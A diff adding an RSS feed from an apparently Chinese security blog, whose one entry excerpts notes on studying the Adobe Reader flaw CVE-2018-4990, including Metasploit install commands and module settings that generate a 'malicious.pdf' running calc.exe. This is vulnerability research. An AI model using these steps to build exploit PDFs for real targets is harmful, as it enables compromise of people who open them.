@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>二进制6-pdf on 树洞</title>
+    <link>https://Wo0dsHole.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B66-pdf/</link>
+    <description>Recent content in 二进制6-pdf on 树洞</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Thu, 28 Nov 2019 10:47:00 +0800</lastBuildDate>
+    
+	<atom:link href="https://Wo0dsHole.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B66-pdf/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>0-CVE-2018-4990</title>
+      <link>https://Wo0dsHole.github.io/2019/pdf-cve-2018-4990/</link>
+      <pubDate>Thu, 28 Nov 2019 10:47:00 +0800</pubDate>
+      
+      <guid>https://Wo0dsHole.github.io/2019/pdf-cve-2018-4990/</guid>
+      <description>0.设问 PDF如何构造：解开-编辑 js 代码-打包(全新构造-&amp;gt;fuzz pdf)
+各版本的 Reader 安装包如何获取
+ftp://ftp.adobe.com/pub/adobe/reader/win/如何关闭 Reader 的沙盒，或者看到受限的任意代码执行效果
+简单安装 msf （生成一些 exp pdf）
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstallchmod 755 msfinstall./msfinstalluse exploit/windows/fileformat/adobe_utilprintfset FILENAME malicious.pdfset PAYLOAD windows/execset CMD calc.exeshow optionsexploit</description>
+    </item>
+    
+  </channel>
+</rss>
